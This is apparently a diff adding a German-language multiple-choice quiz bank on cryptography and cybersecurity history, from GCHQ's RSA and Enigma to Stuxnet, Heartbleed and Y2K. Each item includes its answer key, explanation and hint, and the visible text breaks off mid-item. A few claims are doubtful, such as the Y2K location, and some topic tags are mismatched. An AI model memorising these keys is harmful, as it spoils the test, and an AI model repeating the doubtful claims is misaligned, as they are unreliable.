@@ -1,1 +1,642 @@
-{}
+[
+  {
+    "id": 50001,
+    "topic": "cybersecurity",
+    "difficulty": "hard",
+    "question": "Clifford Cocks bei GCHQ erfand RSA 1973 unabhängig – vier Jahre vor der öffentlichen Entdeckung. Seine zentrale Erkenntnis war:",
+    "options": [
+      "Die rechnerische Schwierigkeit, das Produkt zweier großer Primzahlen zu faktorisieren, als Falltürfunktion für Public-Key-Verschlüsselung zu nutzen",
+      "Elliptische Kurven über endlichen Körpern für den Schlüsselaustausch zu verwenden",
+      "Ein hashbasiertes Signaturschema zu implementieren, das gegen Quantenangriffe resistent ist",
+      "Eine symmetrische Chiffre auf Basis von Substitutions-Permutations-Netzwerken zu entwerfen"
+    ],
+    "correctIndex": 0,
+    "explanation": "Cocks erkannte, dass $n=pq$ (Produkt zweier großer Primzahlen) als Falltür dienen kann: Verschlüsselung mit dem öffentlichen Schlüssel ist leicht, aber Entschlüsselung erfordert die Kenntnis von $p$ und $q$. Das ist mathematisch identisch mit RSA, wie es Rivest, Shamir und Adleman 1978 veröffentlichten.",
+    "realWorld": "Die Entdeckung von GCHQ blieb 24 Jahre lang geheim. James Ellis, der die Idee der „nicht-geheimen Verschlüsselung“ formulierte, starb 23 Tage bevor GCHQ seine Priorität anerkannte.",
+    "hint": "Die Falltürfunktion beruht darauf, dass Multiplizieren leicht ist, Faktorisieren aber schwer."
+  },
+  {
+    "id": 50002,
+    "topic": "cybersecurity",
+    "difficulty": "hard",
+    "question": "IBM entdeckte 1974 die differentielle Kryptoanalyse und entwarf die DES-S-Boxen so, dass sie dagegen resistent sind. Differentielle Kryptoanalyse funktioniert, indem sie:",
+    "options": [
+      "analysiert, wie bestimmte Differenzen in Klartextpaaren sich durch die Chiffre fortpflanzen und vorhersehbare Differenzen in Chiffretextpaaren erzeugen",
+      "alle möglichen Schlüssel per Brute Force ausprobiert, bis die richtige Entschlüsselung gefunden ist",
+      "Timing-Seitenkanäle in der Hardware-Implementierung der Chiffre ausnutzt",
+      "lineare Approximationen der Booleschen Funktionen der Chiffre verwendet"
+    ],
+    "correctIndex": 0,
+    "explanation": "Differentielle Kryptoanalyse verfolgt Eingabedifferenzen $\\Delta X$ durch jede Runde und nutzt nicht-uniforme Verteilungen von Ausgabedifferenzen in S-Boxen aus. IBMs S-Boxen wurden so gestaltet, dass alle differentiellen Charakteristiken nur sehr geringe, möglichst gleichmäßige Wahrscheinlichkeiten haben.",
+    "realWorld": "Die Technik wurde 1990 von Biham und Shamir unabhängig wiederentdeckt – 16 Jahre später. IBMs Schweigen gilt als eine der folgenreichsten Unterdrückungen einer mathematischen Methode in der zivilen Kryptographie.",
+    "hint": "Sie untersucht, wie XOR-Differenzen zwischen Klartextpaaren die Chiffretext-Differenzen beeinflussen."
+  },
+  {
+    "id": 50003,
+    "topic": "cybersecurity",
+    "difficulty": "sota",
+    "question": "Die Hintertür im NSA-Standard Dual_EC_DRBG beruhte auf der Beziehung zwischen zwei Punkten $P$ und $Q$ auf elliptischen Kurven. Wenn die NSA den diskreten Logarithmus $e$ kannte, so dass $Q=eP$ gilt, konnte sie:",
+    "options": [
+      "alle zukünftigen Ausgaben des Pseudozufallszahlengenerators aus einem einzigen 32-Byte-Ausgabesample vorhersagen und damit jede TLS-Sitzung entschlüsseln, die ihn verwendet",
+      "Nachrichten nur entschlüsseln, wenn sie zusätzlich den privaten Schlüssel des TLS-Zertifikats des Servers hatte",
+      "zwar den Seed rekonstruieren, aber wegen Forward Secrecy keine zukünftigen Ausgaben vorhersagen",
+      "nur Implementierungen angreifen, die P-256 verwenden, nicht aber P-384"
+    ],
+    "correctIndex": 0,
+    "explanation": "Mit $Q=eP$ erlaubt eine beobachtete Ausgabe $r=x(kP)$ dem Angreifer, $e^{-1}\\cdot rP = kQ$ zu berechnen und so den internen Zustand zu rekonstruieren. Von dort an sind alle zukünftigen Ausgaben deterministisch vorhersagbar. Das ist ein vollständiger Bruch des PRNG.",
+    "realWorld": "RSA Security machte Dual_EC in BSAFE zum Standard – Berichten zufolge nach einer Zahlung von 10 Mio. USD durch die NSA. Snowdens Dokumente bestätigten das BULLRUN-Programm zur Unterwanderung kryptographischer Standards.",
+    "hint": "Kennt man den diskreten Log zwischen P und Q, kann man aus jeder Ausgabe den internen Zustand zurückrechnen."
+  },
+  {
+    "id": 50004,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "Das VENONA-Projekt brach sowjetische One-Time-Pad-Nachrichten – obwohl diese theoretisch unknackbar sind (Shannon 1949). Möglich war das, weil:",
+    "options": [
+      "sowjetische Produktionsfehler dazu führten, dass manche OTP-Schlüsselseiten dupliziert wurden; dadurch entstand „Depth“, die mittels Known-Plaintext-Techniken kryptoanalytisch ausgenutzt werden konnte",
+      "die USA per Spionage Kopien sowjetischer Codebücher gestohlen hatten",
+      "Quantencomputer-Prototypen bei Bell Labs das Schlüsselmaterial faktorisieren konnten",
+      "die Sowjets statt echter Zufallsschlüssel einen schwachen Pseudozufallszahlengenerator nutzten"
+    ],
+    "correctIndex": 0,
+    "explanation": "Ein One-Time Pad ist genau dann perfekt sicher, wenn jede Schlüsselseite exakt einmal verwendet wird. Wenn zwei Nachrichten denselben Schlüssel teilen („Depth“), liefert XOR der Chiffretexte das XOR der Klartexte, das sich mit linguistischer Analyse auflösen lässt.",
+    "realWorld": "VENONA lief von 1943 bis 1980 und wurde 1995 freigegeben – ein 52-jähriges Geheimnis, das u. a. die Rosenbergs, Klaus Fuchs und Dutzende sowjetische Spione im Manhattan-Projekt identifizierte.",
+    "hint": "Das One-Time Pad ist perfekt – aber nur, wenn man es niemals wiederverwendet."
+  },
+  {
+    "id": 50005,
+    "topic": "cybersecurity",
+    "difficulty": "hard",
+    "question": "Skipjack, die geheime NSA-Blockchiffre im Clipper-Chip, verletzte ein fundamentales kryptographisches Prinzip namens:",
+    "options": [
+      "Kerckhoffs’ Prinzip – ein Kryptosystem soll sicher sein, selbst wenn alles am System außer dem Schlüssel öffentlich bekannt ist",
+      "Shannons Maxime – der Gegner kennt das System, aber Verwirrung und Diffusion sichern es ab",
+      "Das Dolev-Yao-Bedrohungsmodell – der Angreifer kontrolliert das Netzwerk, kann die Chiffre aber nicht brechen",
+      "Das Random-Oracle-Modell – Hashfunktionen verhalten sich wie ideale Zufallsfunktionen"
+    ],
+    "correctIndex": 0,
+    "explanation": "Kerckhoffs’ Prinzip (1883) fordert, dass Sicherheit allein im Schlüssel liegt, nicht in der Geheimhaltung des Algorithmus. Skipjacks Sicherheit beruhte auf Klassifizierung – nach der Freigabe 1998 attackierten Biham und Shamir 31 von 32 Runden innerhalb weniger Monate.",
+    "realWorld": "Das Scheitern des Clipper-Chips etablierte die moderne Norm: Öffentliche Krypto-Standards (AES, SHA-3, Post-Quantum) müssen offene Begutachtung durchlaufen.",
+    "hint": "Eine Chiffre soll sicher sein, selbst wenn der Gegner genau weiß, wie sie funktioniert – nur der Schlüssel muss geheim bleiben."
+  },
+  {
+    "id": 50006,
+    "topic": "cryptography",
+    "difficulty": "sota",
+    "question": "Die entscheidende mathematische Schwäche der Enigma-Maschine, die Turing ausnutzte, war:",
+    "options": [
+      "Die Reziprozität und die Eigenschaft, dass Enigma niemals einen Buchstaben auf sich selbst abbildet – eine Nebenbedingung, die riesige Teile des Schlüsselraums eliminiert",
+      "Die Rotorverdrahtung war in allen Maschinen identisch, was Vorberechnung erlaubte",
+      "Die Steckbrett-Verbindungen waren anhand des Datums vorhersagbar",
+      "Nachrichten begannen immer mit „Heil Hitler“, was Known Plaintext lieferte"
+    ],
+    "correctIndex": 0,
+    "explanation": "Die reziproke Substitution (wenn A→K, dann K→A) kombiniert mit der No-Self-Encryption-Eigenschaft bedeutet: Für jedes vermutete Klartextstück („crib“) erzeugen falsche Rotorstellungen schnell Widersprüche. Turings Bombe nutzte diese Constraints, um ~17.576 Einstellungen in Minuten zu testen.",
+    "realWorld": "Ultra-Informationen verkürzten den Zweiten Weltkrieg schätzungsweise um 2 Jahre und retteten ~14 Millionen Leben. Die 10.000 Menschen in Bletchley Park hielten das Geheimnis 29 Jahre lang.",
+    "hint": "Ein Buchstabe kann nie zu sich selbst verschlüsselt werden – diese scheinbar kleine Einschränkung ist fatal."
+  },
+  {
+    "id": 50007,
+    "topic": "cryptography",
+    "difficulty": "sota",
+    "question": "Bill Tutte rekonstruierte die Lorenz SZ40/42 in Bletchley Park, ohne die Maschine jemals gesehen zu haben. Seine Methode beruhte auf:",
+    "options": [
+      "statistischer Analyse von „Depth“ (überlappende Schlüsselströme) zweier Nachrichten mit gleichen Radeinstellungen, wodurch die logische Struktur aller 12 Räder sichtbar wurde",
+      "dem Erbeuten einer Lorenz-Maschine von einem deutschen U-Boot",
+      "dem Ableiten der Lorenz-Schlüsselstruktur aus Enigma-Entzifferungen",
+      "dem Brute-Force-Test aller Rotorkonfigurationen auf Colossus"
+    ],
+    "correctIndex": 0,
+    "explanation": "Als zwei Nachrichten versehentlich mit identischen Radpositionen gesendet wurden, erhielt Tutte das XOR zweier Klartexte. Durch statistische Analyse dieser „Depth“ leitete er die Anzahl der Pins auf allen 12 Rädern und ihre Interaktionsmuster ab – und rekonstruierte so die Logik der Maschine rein mathematisch.",
+    "realWorld": "Tommy Flowers baute Colossus – den ersten programmierbaren elektronischen Rechner – um Tuttes Kryptoanalyse zu operationalisieren. Colossus blieb bis 2000 geheim; dadurch wurde ENIAC 55 Jahre lang fälschlich als „erster“ angesehen.",
+    "hint": "Zwei Nachrichten mit gleichen Einstellungen erzeugen „Depth“: Das XOR der Klartexte verrät Struktur."
+  },
+  {
+    "id": 50008,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "William Friedmans Team knackte 1940 Japans Purple-Chiffriermaschine, indem es erkannte, dass der Mechanismus nutzte:",
+    "options": [
+      "Telefon-Schrittschalter (6×25 Uniselector) statt Rotorsysteme – eine polyalphabetische Substitution mit einer Periode, die durch die Schaltfolge bestimmt wird",
+      "Enigma-artige Rotoren mit japanischen Katakana-Zeichensätzen",
+      "ein One-Time-Pad-System, verteilt per Diplomatenkurier",
+      "eine Buchchiffre auf Basis standardisierter japanischer Diplomaten-Codebücher"
+    ],
+    "correctIndex": 0,
+    "explanation": "Genevieve Grotjan fand wiederkehrende Muster im Chiffretext in Abständen von 25 – der Zahl der Positionen eines Telefon-Schrittschalters. Das zeigte, dass Purple das Alphabet in eine Gruppe von 6 und eine von 20 aufteilte, die jeweils von separaten Schrittschalter-Bänken verschlüsselt wurden.",
+    "realWorld": "MAGIC-Informationen aus Purple-Entzifferungen gaben US-Führungskräften Einblick in japanische diplomatische Positionen; Pearl Harbor gelang dennoch, weil militärische Taktikchiffren andere Systeme nutzten.",
+    "hint": "Die Periode 25 deutete auf ein elektromechanisches Bauteil mit genau 25 Stellungen hin."
+  },
+  {
+    "id": 50009,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "Der Code der Navajo Code Talkers wurde nie gebrochen, weil er ein zweistufiges Kodierungssystem verwendete. Die erste Ebene war:",
+    "options": [
+      "militärische Begriffe durch unzusammenhängende Navajo-Wörter zu ersetzen (z. B. „Schildkröte“ für „Panzer“), während die zweite Ebene mehrere Navajo-Wörter pro englischem Buchstaben nutzte, um Häufigkeitsanalyse zu verhindern",
+      "eine einfache Wort-für-Wort-Übersetzung von Englisch nach Navajo",
+      "eine mathematisch erzeugte Chiffre mit Navajo-Phonemen als Schlüsselalphabet",
+      "Standard-Militärcodes in Navajo-Syntax übersetzt"
+    ],
+    "correctIndex": 0,
+    "explanation": "Der Code nutzte ~450 militärische Begriffe, die metaphorisch zugeordnet wurden (Jagdflugzeug = „Kolibri“). Für nicht abgedeckte Wörter gab es ein Navajo-Alphabet, in dem jeder englische Buchstabe durch mehrere Navajo-Wörter repräsentiert werden konnte (z. B. „A“ durch „Ameise“, „Apfel“ oder „Axt“), was Häufigkeitsanalyse aushebelte.",
+    "realWorld": "Die Code Talkers konnten eine dreizeilige Nachricht in 20 Sekunden kodieren, senden und dekodieren – Chiffriermaschinen brauchten dafür 30 Minuten. Geschwindigkeit und Unknackbarkeit in einem System.",
+    "hint": "Mehrere mögliche Kodierungen pro Buchstabe zerstören die Statistik, die Häufigkeitsanalyse ausnutzt."
+  },
+  {
+    "id": 50010,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "Das Zimmermann-Telegramm, 1917 von Room 40 entschlüsselt, schlug vor, Deutschland würde Mexiko helfen, welche US-Territorien zurückzuerobern?",
+    "options": [
+      "Texas, New Mexico und Arizona – Gebiete, die im Mexikanisch-Amerikanischen Krieg 1846–1848 verloren gingen",
+      "Kalifornien, Nevada und Oregon – die gesamte Pazifikküste",
+      "Florida und Louisiana – Gebiete mit historischen spanischen Ansprüchen",
+      "alle US-Bundesstaaten südlich der Mason-Dixon-Linie"
+    ],
+    "correctIndex": 0,
+    "explanation": "Zimmermann schlug vor: Wenn die USA in den Ersten Weltkrieg gegen Deutschland eintreten, solle Mexiko mit deutscher finanzieller Unterstützung die USA angreifen und Texas, New Mexico und Arizona zurückgewinnen (abgetreten im Vertrag von Guadalupe Hidalgo, 1848). Großbritannien musste zudem eine Tarnstory erfinden, um zu verbergen, dass es deutschen Diplomatenverkehr über transatlantische Kabel abhören konnte.",
+    "realWorld": "Als das Telegramm veröffentlicht wurde, bestätigte Arthur Zimmermann selbst dessen Echtheit – ein diplomatisches Desaster. Fünf Wochen später erklärten die USA Deutschland den Krieg und kippten damit das Kräfteverhältnis entscheidend.",
+    "hint": "Genannt wurden Gebiete, die Mexiko nach dem Mexikanisch-Amerikanischen Krieg an die USA abtreten musste."
+  },
+  {
+    "id": 50011,
+    "topic": "cybersecurity",
+    "difficulty": "sota",
+    "question": "Stuxnet griff Irans Uran-Zentrifugen in Natanz an, indem es Siemens S7-315/417-PLCs manipulierte. Die raffinierteste Funktion des Wurms war:",
+    "options": [
+      "ein Man-in-the-Middle auf die physische Realität – normale Telemetrie wurde an Operatoren abgespielt, während heimlich Rotorgeschwindigkeiten verändert wurden, um mechanisches Versagen zu verursachen",
+      "alle Zentrifugendaten per Ransomware zu verschlüsseln, bis Iran in Kryptowährung zahlte",
+      "die Kühlung der Anlage abzuschalten, um eine nukleare Kernschmelze auszulösen",
+      "falsche Geheimdienstberichte an IAEA-Inspektoren zu senden"
+    ],
+    "correctIndex": 0,
+    "explanation": "Stuxnet fing die Kommunikation zwischen SCADA-System und PLCs ab, zeichnete in einer Aufklärungsphase normale Betriebsdaten auf und änderte in Angriffszügen die Rotorgeschwindigkeit zwischen 1.410 Hz und 2 Hz (normal: 1.064 Hz) – während es gleichzeitig aufgezeichnete Normaltelemetrie zurückspielte. Operatoren sahen „alles normal“, während die Zentrifugen sich selbst zerstörten.",
+    "realWorld": "Schätzungsweise 984 Zentrifugen wurden zerstört. Der Wurm nutzte gleichzeitig vier Zero-Day-Exploits – eine beispiellose Komplexität, die sofort auf einen staatlichen Akteur hindeutete.",
+    "hint": "Der Angriff war unsichtbar, weil der Wurm zeigte, was man erwartete – nicht, was tatsächlich passierte."
+  },
+  {
+    "id": 50012,
+    "topic": "cybersecurity",
+    "difficulty": "hard",
+    "question": "Die Heartbleed-Schwachstelle (CVE-2014-0160) in OpenSSL erlaubte das Auslesen von Server-Speicher, weil:",
+    "options": [
+      "die TLS-Heartbeat-Implementierung das Feld für die Payload-Länge nicht validierte, sodass pro Anfrage bis zu 64 KB angrenzender Speicher angefordert werden konnten",
+      "der private SSL-Schlüssel im Klartext in einer weltweit lesbaren Konfigurationsdatei gespeichert war",
+      "ein Buffer Overflow im TLS-Handshake beliebige Codeausführung erlaubte",
+      "der Zufallszahlengenerator für Sitzungsschlüssel zu wenig Entropie hatte"
+    ],
+    "correctIndex": 0,
+    "explanation": "RFC 6520 definiert TLS Heartbeat: Der Client sendet eine Payload plus Längenfeld, der Server spiegelt sie zurück. OpenSSL nutzte `memcpy` mit der vom Client angegebenen Länge, ohne zu prüfen, ob die tatsächliche Payload so lang ist. Ein Angreifer konnte 64 KB behaupten, aber z. B. nur 1 Byte senden – der Server gab dann 64 KB aus, was gerade im Speicher lag: private Schlüssel, Passwörter, Tokens.",
+    "realWorld": "Der Fix war eine einzelne Bounds-Check-Zeile: `if (1 + 2 + payload + 16 > s->s3->rrec.length) return 0;` – vielleicht der folgenreichste Einzeiler der Softwaregeschichte.",
+    "hint": "Der Server vertraute der vom Client behaupteten Payload-Länge, ohne sie gegen die tatsächlich empfangenen Daten zu prüfen."
+  },
+  {
+    "id": 50013,
+    "topic": "cryptography",
+    "difficulty": "sota",
+    "question": "Googles SHAttered-Angriff erzeugte die erste praktische SHA-1-Kollision. Die Rechenkosten lagen ungefähr bei:",
+    "options": [
+      "$2^{63.1}$ SHA-1-Berechnungen – 100.000× schneller als Brute Force ($2^{80}$), aber immer noch ca. 6.500 CPU-Jahre; das zeigt die Lücke zwischen theoretischem und praktischem Bruch",
+      "$2^{80}$ Berechnungen – identisch zu Brute Force und ohne theoretischen Speedup",
+      "$2^{40}$ Berechnungen – auf einem einzelnen Laptop in Stunden machbar",
+      "$2^{128}$ Berechnungen – mehr als die theoretische Kollisionsresistenz von SHA-256"
+    ],
+    "correctIndex": 0,
+    "explanation": "Wangs theoretischer Angriff (2005) reduzierte die Kollisionsresistenz von SHA-1 von $2^{80}$ auf etwa $2^{69}$. Stevens et al. verbesserten dies auf $2^{63.1}$ Operationen mittels differentieller Pfadanalyse. Google setzte dafür Rechenleistung im Umfang von ca. 6.500 CPU-Jahren (bzw. 110 GPU-Jahren) ein – praktikabel für gut ausgestattete Angreifer.",
+    "realWorld": "Binnen Stunden nach SHAttered kam es zu Störungen im WebKit-SVN-Repository durch einen Proof-of-Concept mit kollidierenden PDFs. Linus Torvalds beschleunigte daraufhin den Wechsel von Git von SHA-1 zu SHA-256.",
+    "hint": "Viel schneller als Brute Force, aber immer noch extrem teuer – realistisch nur für Staaten oder Tech-Giganten."
+  },
+  {
+    "id": 50014,
+    "topic": "cybersecurity",
+    "difficulty": "sota",
+    "question": "Das NSA-System XKeyscore, 2013 durch Snowden enthüllt, unterschied sich von anderen Überwachungsprogrammen vor allem dadurch, dass:",
+    "options": [
+      "Analysten Inhalte von E-Mails, Chats und Browserverlauf in Echtzeit durchsuchen konnten – ohne vorherige gerichtliche Genehmigung, lediglich mit einem selbst bestätigten Begründungsformular",
+      "es ausschließlich Metadaten sammelte (Sender, Empfänger, Zeitstempel) und niemals Inhalte",
+      "für jede einzelne Suchanfrage ein FISA-Gerichtsbeschluss erforderlich war",
+      "es nur Kommunikation überwachte, die in die USA hinein- oder aus den USA herausging, nicht aber inländischen Verkehr"
+    ],
+    "correctIndex": 0,
+    "explanation": "Trainingsmaterialien zu XKeyscore sagten, Analysten könnten „nahezu alles durchsuchen, was ein typischer Nutzer im Internet tut“ über ein simples Webformular. Anders als PRISM (Zugriff auf Unternehmensserver unter rechtlichem Druck) arbeitete XKeyscore auf rohem Internetverkehr an weltweiten Sammelpunkten; die einzige Zugriffshürde war Analysten-Selbstzertifizierung.",
+    "realWorld": "NSA-Folien zeigten, XKeyscore könne „alle verschlüsselten Word-Dokumente“ eines Ziellandes finden, nach Sprache suchen oder Personen identifizieren, die bestimmte Begriffe suchten – Fähigkeiten, die selbst erfahrene Intelligence-Profis schockierten.",
+    "hint": "Der entscheidende Unterschied war das Fehlen externer Kontrolle – Analysten waren ihre eigenen Gatekeeper."
+  },
+  {
+    "id": 50015,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "Die Kryptos-Skulptur der CIA hat vier verschlüsselte Abschnitte. K1–K3 wurden gelöst, K4 ist nach 34 Jahren noch ungebrochen. Welche Technik nutzten K1 und K2?",
+    "options": [
+      "Vigenère-Chiffre mit Schlüsselwort-Substitution, gefolgt von Transposition – klassische Techniken, die beharrlicher Kryptoanalyse nachgaben",
+      "AES-256 mit einem Schlüssel, der in den physischen Dimensionen der Skulptur steckt",
+      "RSA-Public-Key-Verschlüsselung, deren Private Key der CIA-Direktor hält",
+      "quantensichere gitterbasierte Verschlüsselung, entworfen von NSA-Mathematikern"
+    ],
+    "correctIndex": 0,
+    "explanation": "K1 nutzte eine modifizierte Vigenère-Chiffre (Keyword: PALIMPSEST), K2 Vigenère mit dem Keyword ABSCISSA plus Transposition. K3 verwendete eine schlüsselbasierte spaltenweise Transposition. K4s Methode ist unbekannt – möglicherweise nutzt sie eine neue Chiffre oder benötigt K1–K3 als zusätzliches Schlüsselmaterial.",
+    "realWorld": "Sanborn gab dem CIA-Direktor die Lösung in einem versiegelten Umschlag. Auf die Frage, ob die NSA es gelöst habe, sagte er: „Ich nehme an, ja. Sie werden es mir nicht sagen.“",
+    "hint": "Die ersten Teile nutzen jahrhundertealte klassische Chiffren – aber der letzte Teil könnte völlig anders sein."
+  },
+  {
+    "id": 50016,
+    "topic": "cybersecurity",
+    "difficulty": "hard",
+    "question": "Das NSA-TEMPEST-Programm zeigte, dass elektronische Geräte über elektromagnetische Abstrahlung Informationen leaken. Der spektakulärste demonstrierte Angriff war:",
+    "options": [
+      "das vollständige Rekonstruieren des Bildes eines CRT-Monitors aus elektromagnetischer Strahlung, abgefangen aus einem anderen Raum – oder sogar einem anderen Gebäude",
+      "das Auslesen von Tastendrücken nur dann, wenn die Tastatur per USB verbunden ist",
+      "das Abfangen von WLAN-Signalen, um festzustellen, welche Websites besucht werden",
+      "das Koppeln mit Geräten in der Nähe über Bluetooth-Schwachstellen"
+    ],
+    "correctIndex": 0,
+    "explanation": "Wim van Eck zeigte 1985, dass CRT-Monitore Strahlung emittieren, deren Frequenzen das Abtasten des Elektronenstrahls spiegeln. Mit modifiziertem TV-Empfänger und Richtantenne konnte er aus hunderten Metern Entfernung durch Wände lesbare Bildschirmbilder rekonstruieren – „Van Eck phreaking“.",
+    "realWorld": "Moderne LCDs leaken weniger als CRTs, sind aber weiterhin angreifbar. Forschende zeigten Abhören über HDMI-Kabelabstrahlung, LED-Indikator-Muster und sogar akustisches Spulen-/Kondensatorpfeifen.",
+    "hint": "CRT-Monitore nutzen einen Elektronenstrahl, der die Zeilen abtastet – und dabei Funksignale erzeugt, die dieselben Informationen tragen."
+  },
+  {
+    "id": 50017,
+    "topic": "cybersecurity",
+    "difficulty": "hard",
+    "question": "Die Sowjetunion verbot die Kybernetik 1950–1961 als „bourgeoise Pseudowissenschaft“. Der Hauptgrund war:",
+    "options": [
+      "ideologisch – Wieners Kybernetik setzte biologische und mechanische Systeme gleich und widersprach damit dem dialektischen Materialismus, der Lebendes und Nicht-Lebendes unterscheidet",
+      "militärisch – man fürchtete, Kybernetikforschung würde dem Westen sowjetische Computerfähigkeiten verraten",
+      "ökonomisch – Kybernetikforschung war zu teuer für die Nachkriegswirtschaft",
+      "persönlich – Stalin hatte einen Groll gegen Norbert Wiener wegen eines abgelehnten Kooperationsvorschlags"
+    ],
+    "correctIndex": 0,
+    "explanation": "Sowjetische Ideologie betrachtete Lebewesen (dialektischer Materialismus) als grundsätzlich verschieden von Maschinen. Wieners Kybernetik behandelte beide als informationsverarbeitende Systeme mit Rückkopplung – eine Gleichsetzung, die Philosophen als ideologisch gefährlich und „anti-marxistisch“ ansahen.",
+    "realWorld": "Ironischerweise wäre Kybernetik ideal für zentrale Planwirtschaft gewesen. Anatoly Kitov schlug 1959 vor, Computer für Wirtschaftsplanung zu nutzen – und wurde dafür aus der Partei ausgeschlossen.",
+    "hint": "Der Einwand war philosophisch: Lebendes mit Maschinen gleichzusetzen, griff Kernannahmen der sowjetischen Ideologie an."
+  },
+  {
+    "id": 50018,
+    "topic": "cybersecurity",
+    "difficulty": "hard",
+    "question": "Das CIA-Spionageflugzeug A-12 OXCART (getestet bei Area 51) flog Mach 3,2. Die größte ingenieurtechnische Herausforderung bei dieser Geschwindigkeit war:",
+    "options": [
+      "thermische Ausdehnung – die Titanstruktur erhitzte sich auf ~300°C und wuchs um mehrere Zentimeter; dadurch brauchte man Dehnfugen und Tankdichtungen, die erst im heißen Zustand dicht wurden",
+      "Funkkommunikation bei Überschall wegen Ionisation der umgebenden Luft",
+      "den Piloten bei extremen G-Kräften in Kurven bei Bewusstsein zu halten",
+      "Überschallknalle zu verhindern, die Beobachter am Boden alarmieren würden"
+    ],
+    "correctIndex": 0,
+    "explanation": "Bei Mach 3,2 heizte Luftreibung die Titanhaut der A-12 auf über 300°C auf. Der Rumpf dehnte sich so stark aus, dass Treibstofftanks am Boden leckten – sie waren so konstruiert, dass sie erst bei Betriebstemperatur durch Ausdehnung abdichteten. Piloten beschrieben das Flugzeug beim Rollen als „schwitzend vor Treibstoff“.",
+    "realWorld": "Die CIA musste Titan heimlich über Tarnfirmen aus der Sowjetunion beschaffen – dem wichtigsten Lieferanten des Metalls, das man brauchte, um ein Flugzeug zu bauen, das die Sowjetunion ausspionieren sollte.",
+    "hint": "Metall dehnt sich bei Hitze aus. Wenn das ganze Flugzeug aus Metall ist, wird das existenziell."
+  },
+  {
+    "id": 50019,
+    "topic": "cybersecurity",
+    "difficulty": "easy",
+    "question": "Das US-Nuklear-Startsystem (SACDIN) nutzte 8-Zoll-Disketten bis 2019. Das Pentagon argumentierte, das sei sogar ein Sicherheitsvorteil, weil:",
+    "options": [
+      "das System vollständig air-gapped war, kein modernes OS nutzte und die Hardware so obsolet war, dass Angreifer kaum kompatible Malware bauen konnten",
+      "Disketten Nuklear-Startcodes sicherer speichern als Solid-State-Laufwerke",
+      "magnetische Speicherung resistent gegen EMP-Angriffe sei",
+      "es billiger war, als auf moderne Hardware umzurüsten"
+    ],
+    "correctIndex": 0,
+    "explanation": "Der IBM Series/1 lief mit einem proprietären OS ohne Netzwerk, ohne USB, ohne Funkinterfaces und mit einem Speichermedium-Format, das so veraltet war, dass ein bewaffneter Diskettenangriff praktisch spezielle Hardware voraussetzen würde, die kaum noch existiert. Paradoxerweise war das sicherer als viele moderne Systeme.",
+    "realWorld": "Das System wurde 2019 vor allem deshalb ersetzt, weil Ersatzteile für IBM-Hardware aus den 1970ern nicht mehr zu beschaffen waren – nicht wegen eines akuten Sicherheitsproblems.",
+    "hint": "Manchmal ist die beste Cybersecurity, so veraltet zu sein, dass niemand mehr weiß, wie die Technik funktioniert."
+  },
+  {
+    "id": 50020,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "2012 fand man in einem Kamin eine tote WWII-Brieftaube mit einer verschlüsselten Nachricht. GCHQ versuchte sie zu dekodieren und kam zu dem Schluss:",
+    "options": [
+      "wahrscheinlich wurde ein One-Time Pad genutzt; ohne die spezifische Schlüsselseite – die nach dem Krieg zerstört wurde – ist die Nachricht theoretisch unknackbar",
+      "es war eine einfache Substitutionschiffre, die GCHQ in Stunden knackte",
+      "die Taube war ein Schwindel eines Geschichts-Enthusiasten",
+      "die Nachricht nutzte Enigma und wurde mit Bletchley-Park-Methoden gelöst"
+    ],
+    "correctIndex": 0,
+    "explanation": "GCHQ stellte fest, dass die Nachricht aus 27 Fünfergruppen bestand – konsistent mit einem One-Time Pad oder Codebuchsystem, wie es z. B. beim SOE genutzt wurde. Ohne die konkrete Schlüsselseite oder das Codebuch – beides wurde nach Gebrauch routinemäßig vernichtet – ist die Nachricht mathematisch unknackbar.",
+    "realWorld": "Ein kanadischer Historiker behauptete, er habe sie mit einem Codebuch aus dem Ersten Weltkrieg entschlüsselt („Jerry artillery positions at…“). GCHQ nannte das diplomatisch „wishful thinking“.",
+    "hint": "Wenn der Schlüssel einmal verwendet und dann zerstört wurde, hilft dir nicht einmal Enigma-Know-how."
+  },
+  {
+    "id": 50021,
+    "topic": "cryptography",
+    "difficulty": "sota",
+    "question": "Cicada 3301s Rekrutierungsrätsel (2012–2014) verlangten interdisziplinäre Fähigkeiten. Der physische Teil bestand aus:",
+    "options": [
+      "QR-Codes, die gleichzeitig in 14 Ländern an Laternenmasten hingen – Sydney, Seoul, Warschau, Miami, Paris u. a. – und ein global verteiltes Team erforderten",
+      "einem einzigen Ort in Washington, D.C., an dem Solver persönlich erscheinen mussten",
+      "USB-Sticks, die an die ersten 100 erfolgreichen Solver der Online-Phase verschickt wurden",
+      "einer Schnitzeljagd, beschränkt auf US-Universitätscampus"
+    ],
+    "correctIndex": 0,
+    "explanation": "Nach steganografischen, kryptografischen und zahlentheoretischen Online-Aufgaben wurden Solver zu physischen Orten geleitet, wo Poster mit QR-Codes hingen. Die gleichzeitige globale Ausbringung in 14 Ländern zeigte, dass die Organisatoren erhebliche Ressourcen und weltweite operative Fähigkeit hatten.",
+    "realWorld": "Dass Cicada 3301 physische Platzierungen in 14 Ländern koordinieren konnte und dennoch anonym blieb, ist selbst eine der beeindruckendsten OpSec-Leistungen der Internetgeschichte.",
+    "hint": "Man musste weltweit Orte aufsuchen – ein Hinweis auf globale Reichweite der Organisatoren."
+  },
+  {
+    "id": 50022,
+    "topic": "cybersecurity",
+    "difficulty": "easy",
+    "question": "Beim Y2K-Mitternachtswechsel am 1. Januar 2000 unternahmen die USA und Russland einen beispiellosen Schritt:",
+    "options": [
+      "Sie besetzten ein gemeinsames nukleares Kommandozentrum in Cheyenne Mountain, Colorado – russische und amerikanische Offiziere überwachten Seite an Seite die Nuklearstreitkräfte beider Länder",
+      "Sie deaktivierten weltweit alle Nuklearwaffen für 24 Stunden",
+      "Sie schickten alle nuklearen U-Boote auf See, um Land-Computerfehler zu umgehen",
+      "Sie übertrugen die Startautorität von Computern auf eine rein manuelle Befehlskette"
+    ],
+    "correctIndex": 0,
